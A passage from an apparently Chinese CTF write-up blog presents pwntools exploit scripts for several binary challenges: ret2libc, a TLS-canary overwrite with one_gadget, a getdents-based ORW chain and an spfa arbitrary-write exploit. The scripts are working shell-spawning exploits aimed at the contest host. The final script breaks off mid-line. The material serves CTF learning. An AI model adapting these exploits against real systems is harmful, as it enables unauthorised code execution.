src="https://kjimg10.360buyimg.com/ott/jfs/t1/98042/24/22695/37543/63c7aaa0F7e0149da/03e9383158ddc998.png" style="zoom: 80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107429/9/24505/38663/63c7aaa0F8c72c750/90f78d20ec80e81e.png" style="zoom:80%;" /><p>可以看到不断创造线程进入一个带有栈溢出漏洞的函数，值得注意的是，v3 作为 read 的返回值和 i 作为 s 的参数决定了读入的位置，这两者在覆盖的时候均不应被改变（不断的测试发现 v3 不能变，i 按理说可以变成下一次想读入的位置）。</p><p>清楚这一点后，exp 就是普通的 ret2libc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">34686</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./a&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401313</span></span><br><span class="line">call_puts=<span class="number">0x0401090</span></span><br><span class="line">vul=<span class="number">0x04011BA</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x2c</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">0x404028</span>)+p64(call_puts)</span><br><span class="line">payload += p64(vul)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">setbuf_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;libc=======&gt;&quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;setbuf&quot;</span>]))</span><br><span class="line">log.success(<span class="string">&quot;setbuf===&gt;&quot;</span>+<span class="built_in">hex</span>(setbuf_addr))</span><br><span class="line">libc_base=setbuf_addr-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base==&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#libc_base=read_addr-libc.sym[&quot;read&quot;]</span></span><br><span class="line"><span class="comment">#log.success(&quot;read_addr====&gt;&quot;+hex(libc.sym[&quot;read&quot;]))</span></span><br><span class="line"><span class="comment">#log.success(&quot;libc_base====&gt;&quot;+hex(libc_base))</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x2c</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>注：打远程的时候发现泄露 read 的函数地址计算基址时会有偏差，所以换了 setbuf 就成了。libc-2.31 也需要栈对齐。</p><h3 id="enter-the-evil-pwn-land"><a href="#enter-the-evil-pwn-land" class="headerlink" title="enter_the_evil_pwn_land"></a>enter_the_evil_pwn_land</h3><p>题目和上题稍有变化，保护方面多开启了个 canary</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/163026/7/33522/24750/63c7aaa0Fcb1ef617/3becf79a7f742530.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107429/9/24505/38663/63c7aaa0F8c72c750/90f78d20ec80e81e.png" style="zoom:80%;" /><p>当时的第一个想法是利用 puts 泄露canary，不过回过神来发现 puts 过后就直接检测 canary 了，所以打消这个念头。</p><p>记忆中其他绕过 canary 的方法有<strong>劫持 _stack_chk_fail</strong>，还有一种就是<strong>同时修改 canary 和 TLS 结构体</strong>中预存的 canary。前者一般需要任意写，后者的话印象中没遇到过。不过似乎有一种 stack smash 泄露信息的巧妙方法，这就触发了我的脑洞，会不会，有没有一种可能，TLS 结构体就被布置在了<strong>栈</strong>上？况且这道题溢出的空间还不少。</p><p>于是我就 gdb 调试了一下，看了一下栈上的信息</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/167708/4/31793/115472/63c7ab82F05d5d258/d54bbde560c2ee86.png" style="zoom:67%;" /><p>然后就继续往下找，终于在很远处发现了可疑目标：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/57709/16/23077/110254/63c7ab96F17f3a3e3/d2ac97e9c74302f9.png" style="zoom:80%;" /><p>此时我同时将两处覆盖为<code>aaaaaaaa</code>，发现程序不再报 stack smash 错误，说明我们已经成功绕过了 canary，需要说明的是远程偏移和本地不一样，送过去的数据尽量大就行。</p><p>继续打 ret2libc 构造 system(‘/bin/sh’)打不通。</p><p>原因不详，猜测是栈结构被我们搞得七零八落的，于是就考虑打 one_gadget。（不知为何 ubuntu16.04 检测 libc-2.31.so 时会报错，18 的就不会）如下：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/132953/12/29754/44405/63c8b9f0F978fb6b5/e01668aae890faba.png" style="zoom:80%;" /><p>直接打打不通，选择尝试构造条件，因为程序里有 csu 的 gadget，所以将寄存器 r15 和 r12 置零轻而易举：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/69351/29/25073/45548/63c8b9eeFc7a7133f/c5c0d76ceec68220.png" style="zoom:80%;" /><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./a.out&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">35225</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401363</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404030</span>)+p64(<span class="number">0x4010A0</span>)+p64(<span class="number">0x4011DA</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">3000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">setbuf_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=setbuf_addr-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6c7e</span></span><br><span class="line">log.success(<span class="string">&#x27;system==&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">log.success(<span class="string">&#x27;binsh===&gt;&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x000000000040135c</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(one_gadget)</span><br><span class="line"><span class="comment">#payload=payload.ljust(3000,&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="oldfashion-orw"><a href="#oldfashion-orw" class="headerlink" title="oldfashion_orw"></a>oldfashion_orw</h3><p>查看一下保护，NX 开着，看来不是编写 shellcode 题型</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143518/13/33139/24804/63c7ac29F05bbc606/cbde94e9b4214053.png" style="zoom:80%;" /><p>看一下主函数逻辑</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/161218/20/34466/65115/63c7ac22F5927c23f/96c8d82807f603c2.png" style="zoom:80%;" /><p>有个没检查下限导致的栈溢出。通过这段溢出，构造 orw 链即可。</p><p>但这题的 flag 并不叫 flag，我们看一下出题人给的部署文件：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/95051/26/18295/43571/63c7ac21F5f93642c/fb3c8ecc59e11856.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/209215/25/29511/55822/63c7ac20Fe576e25c/e415b3e6429764d6.png" style="zoom:80%;" /><p>所以还应先泄露 flag 名称才行，一开始想的是 chroot 逃逸或者 opendir &amp; readdir 之类的手法？？？虽然我也不会就是了。搞了一天没搞出来就去问了出题人，师傅告诉我就是读目录，<strong>目录也是文件</strong>，忽然想到 “ linux 下一切皆文件” 的理论。</p><p>于是直接想着直接 open(“/“) 这样子看能不能直接把目录相关数据用 read 和 write 读出来，但失败了，似乎 read 读不了目录文件？于是就在 64 位系统调用表上找其他系统调用，最后花了半天找到了 ‘getdents’</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/170693/32/34205/36390/63c7ac20F4f658c9f/6968cf0db5dc8df7.png" style="zoom:80%;" /><p>注：该题的 gadget 里没有 syscall，需要我们改 [ prctl ] 为 [ prctl + offset ] syscall 这样子，最后 4bit 为 0XC。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/6785/4/26433/55787/63c7acfbF533f2b1c/bebae0932440af72.png" style="zoom:80%;" /><p>该题也有 csu，因此可以构造任意系统调用，exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">42614</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">main=<span class="number">0x401315</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r15, r12, r13, r14</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r15</span></span><br><span class="line">    payload = p64(<span class="number">0x40143A</span>) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(<span class="number">0x401420</span>)</span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x401315</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401443</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401441</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#prctl====&gt;syscall</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(elf.got[<span class="string">&quot;prctl&quot;</span>])+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,p8(<span class="number">0xc</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(0,bss,0x10) bss===&gt;&#x27;/&#x27;</span></span><br><span class="line">bss=<span class="number">0x404088</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss,<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(&quot;/&quot;)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fstat</span></span><br><span class="line"><span class="comment">#temp=0x404088</span></span><br><span class="line"><span class="comment">#io.sendafter(&#x27;size?\n&#x27;,str(-1))</span></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*0x38+p64(pop_rdi_ret)+p64(0)</span></span><br><span class="line"><span class="comment">#payload+=p64(pop_rsi_r15_ret)+p64(bss-0x10)+p64(0)</span></span><br><span class="line"><span class="comment">#payload+=p64(0x4010A0)+csu(0,1,elf.got[&quot;prctl&quot;],3,temp,0)</span></span><br><span class="line"><span class="comment">#payload+=csu(0,1,elf.got[&quot;write&quot;],1,temp,0x300)</span></span><br><span class="line"><span class="comment">#payload+=p64(main)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#io.sendafter(&quot;content?\n&quot;,payload)</span></span><br><span class="line"><span class="comment">#io.send(&#x27;aaaaa&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getdents(0,bss,0x300)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss+<span class="number">0x10</span>,<span class="number">78</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],<span class="number">3</span>,bss,<span class="number">0x300</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;write&quot;</span>],<span class="number">1</span>,bss,<span class="number">0x300</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">78</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get flag_name</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">bk=io.recv(<span class="number">20</span>)</span><br><span class="line">log.success(<span class="string">&#x27;flag&#x27;</span>+bk)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(0,bss,0x20) ---- bss=&gt;flag_name</span></span><br><span class="line">bss=<span class="number">0x404088</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss,<span class="number">0x20</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>+bk+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(flag_name)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(3,bss,0x80);write(1,bss,0x80)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">4</span>,bss,<span class="number">0x80</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;write&quot;</span>],<span class="number">1</span>,bss,<span class="number">0x80</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="spfa"><a href="#spfa" class="headerlink" title="spfa"></a>spfa</h3><p>wp 出来了，任意读漏洞当时是看到了的，就是不知道怎么用算法达到任意写的目的。还有一些细节需要注意，下面细说。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><ul><li><p>任意读</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/58250/28/23044/25765/63c7ad58F93fb1283/7bb957defcb03fdb.png" style="zoom:80%;" /></li><li><p>存在于<code>add</code>和<code>spfa</code>内的任意写</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/187146/37/31980/24100/63c7ad55F9bb13d32/bf2a17e2c9189750.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/75161/20/23579/45988/63c7ae06F5dcb0231/ae9e86f5eb192205.png" style="zoom:80%;" /></li><li><p>后门函数</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/146622/35/33316/3113/63c7ae06Fa04326d0/02f29734fe8eaceb.png" style="zoom:80%;" /></li></ul><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li>利用任意读泄露 got 表上的地址，获得 libc_base</li><li>利用任意读泄露 _fini_array 上的地址，获得 proc_base</li><li>利用任意读泄露 environ 内的环境变量栈地址，动调计算偏移得到 main 栈的返回地址</li><li>利用任意写将返回地址覆盖为后门函数</li></ul><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line">io=process(<span class="string">&quot;./spfa&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;chuj.top&quot;,47250)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;spfa&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"><span class="comment">#brute()</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;datas?\n&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get libc_base</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-((elf.sym[<span class="string">&quot;dist&quot;</span>]-elf.got[<span class="string">&quot;setbuf&quot;</span>])//<span class="number">8</span>)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">setbuf=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">libc_base=setbuf-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get proc_base</span></span><br><span class="line">_fini_array=<span class="number">0x6D28</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span 